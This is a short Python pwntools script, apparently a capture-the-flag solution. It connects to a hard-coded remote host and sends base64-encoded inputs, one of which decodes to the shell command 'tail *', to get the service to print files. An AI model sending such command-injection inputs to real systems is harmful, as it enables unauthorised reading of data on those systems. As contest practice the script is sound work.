from pwn import *

p=remote("110.10.212.138",19090)

print p.recv()
p.sendline("TjBfbTRuX2M0bDFfYWc0aW5fWTNzdDNyZDR5OigA")
print p.recv()
p.sendline("aGVsbAo=")
print p.recv()
p.sendline("aGVsbAo==")
print p.recv()
p.sendline("dGFpbCAqCg==")
print p.recv()
print p.recv()
